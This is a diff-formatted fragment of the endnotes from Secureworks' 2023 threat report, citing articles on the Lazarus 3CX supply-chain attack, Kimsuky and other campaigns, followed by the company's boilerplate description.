+Linux malware strengthens links between Lazarus and 
 the 3CX supply\-chain attack, https:www.welivesecurity.
 com20230420linux\-malware\-strengthens\-links\-lazarus\-
-3cx\-supply\-chain\-attack, 42023\.Kimsuky \| Ongoing Campaign Using Tailored 
+3cx\-supply\-chain\-attack, 42023\.
+70 
+Kimsuky \| Ongoing Campaign Using Tailored 
 Reconnaissance Toolkit, https:www.sentinelone.
 comlabskimsuky\-ongoing\-campaign\-using\-tailored\-
-reconnaissance\-toolkit, 52323\.2023 State of the Threat: A Year in Review74ABOUT SECUREWORKSSecureworks (NASDAQ: SCWX) is a global cybersecurity leader that protects customerprogress with Secureworks Taegis, a cloud\-native security analytics platform built on20\+ years of real\-world threat intelligence and research, improving customers' ability todetect advanced threats, streamline and collaborate on investigations, and automatethe right actions.For more information, call 1\-877\-838\-7947 to speak to aSecureworks security specialist or visit secureworks.comAvailability varies by region. 2023 SecureWorks, Inc. All rights reserved.2023 State of the Threat: A Year in Review75
+reconnaissance\-toolkit, 52323\.
+71 
+Supply\-chain attack on 3CX clients, https:www.
+kaspersky.comblogsupply\-chain\-attack\-on\-3cx47698, 
+1\. 72 
+3CX Software Supply Chain Compromise Initiated by a 
+Prior Software Supply Chain Compromise; Suspected 
+North Korean Actor Responsible, https:www.mandiant.
+comresourcesblog3cx\-software\-supply\-chain\-
+compromise, 42723\.
+73 
+North Korean Lazarus Hacking Group Leverages Supply 
+Chain Attacks To Distribute Malware for Cyber Espionage, 
+https:www.cpomagazine.comcyber\-securitynorth\-
+korean\-lazarus\-hacking\-group\-leverages\-supply\-chain\-
+attacks\-to\-distribute\-malware\-for\-cyber\-espionage, 
+1\. 74 
+North Korea's Lazarus Group Turns to Supply Chain 
+Attacks, https:www.darkreading.comthreat\-intelligence
+north\-korea\-s\-lazarus\-group\-turns\-to\-supply\-chain\-attacks, 
+1\. 75 
+ChatGPT just created malware, and that's seriously 
+scary, https:www.digitaltrends.comcomputingchatgpt\-
+created\-malware, 4723\.
+76 
+CISA, NSA, FBI, and International Partners Release Joint 
+CSA on Top Routinely Exploited Vulnerabilities of 2022, 
+https:www.cisa.govnews\-eventsalerts20230803cisa\-
+nsa\-fbi\-and\-international\-partners\-release\-joint\-csa\-top\-
+routinely\-exploited\-vulnerabilities, 8323\.
+77 
+Guildma is now abusing colorcpl.exe LOLBIN, https:isc.
+sans.edudiaryrss29814, 5523\.
+74
+2023 State of the Threat: A Year in Review
+75
+2023 State of the Threat: A Year in Review
+ABOUT SECUREWORKS
+Secureworks (NASDAQ: SCWX) is a global cybersecurity leader that protects customer 
+progress with Secureworks Taegis, a cloud\-native security analytics platform built on 
+20\+ years of real\-world threat intelligence and research, improving customers' ability to 
+detect advanced threats, streamline and collaborate on investigations, and automate
+the right actions.
+For more information, call 1\-877\-838\-7947 to speak to a 
+Secureworks security specialist or visit secureworks.com
+Availability varies by region. 2023 SecureWorks, Inc. All rights reserved.
